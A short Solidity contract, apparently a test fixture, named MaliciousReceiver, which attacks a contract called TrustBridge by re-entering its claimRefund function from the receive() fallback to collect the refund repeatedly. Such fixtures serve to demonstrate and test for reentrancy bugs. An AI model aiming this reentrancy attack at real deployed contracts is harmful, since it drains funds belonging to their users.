// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../TrustBridge.sol";

contract MaliciousReceiver {
    TrustBridge public target;
    uint256 public attackCount;

    constructor(address payable _target) {
        target = TrustBridge(_target);
    }

    function contribute() external payable {
        target.contribute{value: msg.value}();
    }

    function claim() external {
        target.claimRefund();
    }

    receive() external payable {
        if (attackCount < 2) {
            attackCount++;
            target.claimRefund();
        }
    }
}
